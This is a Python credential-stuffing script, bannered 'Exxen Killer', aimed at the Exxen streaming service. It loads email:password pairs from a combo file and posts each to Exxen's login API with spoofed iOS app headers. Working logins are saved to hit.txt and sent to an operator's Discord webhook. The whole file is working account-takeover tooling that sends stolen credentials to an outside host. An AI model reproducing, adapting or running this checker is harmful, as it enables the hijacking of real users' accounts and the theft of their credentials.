import requests,bs4
from dhooks import Webhook
import colorama
from colorama import Back,Fore, Style

colorama.init(autoreset=True)


print(Fore.YELLOW+"""
▄▄▄ .▐▄• ▄ ▐▄• ▄ ▄▄▄ . ▐ ▄     ▄ •▄ ▪  ▄▄▌  ▄▄▌  ▄▄▄ .▄▄▄  
▀▄.▀· █▌█▌▪ █▌█▌▪▀▄.▀·•█▌▐█    █▌▄▌▪██ ██•  ██•  ▀▄.▀·▀▄ █·
▐▀▀▪▄ ·██·  ·██· ▐▀▀▪▄▐█▐▐▌    ▐▀▀▄·▐█·██▪  ██▪  ▐▀▀▪▄▐▀▀▄ 
▐█▄▄▌▪▐█·█▌▪▐█·█▌▐█▄▄▌██▐█▌    ▐█.█▌▐█▌▐█▌▐▌▐█▌▐▌▐█▄▄▌▐█•█▌
 ▀▀▀ •▀▀ ▀▀•▀▀ ▀▀ ▀▀▀ ▀▀ █▪    ·▀  ▀▀▀▀.▀▀▀ .▀▀▀  ▀▀▀ .▀  ▀                                                                                                
""")
okunweb = open('webhook.txt',"r")
hook2 = okunweb.read()
okunown = open('owner.txt',"r")
ownerid = okunown.read()
hook1 = Webhook(hook2)

#Checker

def check(email,password):
    client = requests.session()

#Headers

    h1 = {
        "Host": "api-crm.exxen.com",
        "Origin": "com.exxen.ios",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.5.0) Alamofire/5.4.4",
        "Accept-Language": "tr-TR;q=1.0",
        "Cache-Control": "no-cache",
        "Connection": "close"

    }

#Post Data

    data = {
        
        "Email":email,
        "Password":password,
        "RememberMe":"true"
        
    }
    

#Post Url

    login = client.post('https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764',data=data,headers=h1)
   



#False
    if 'Success":false' in login.text:
        print(Fore.RED+'False: '+email+':'+password)

#True

    elif 'Success":true' in login.text:
        print(Fore.GREEN+'Hit:  '+email+':'+password)
        filee = open('hit.txt','a')
        filee.write('Hit:  '+email+':'+password)
        hook1.send("<@"+ownerid+">"" :tada: Exxen Hit Found ! --> "+email+":"+password)
    else:
        pass


#Combo File

file = open('combo.txt', 'r').readlines()
for i in file:
    seq = i.strip()
    acc = seq.split(':')
    check(acc[0],acc[1])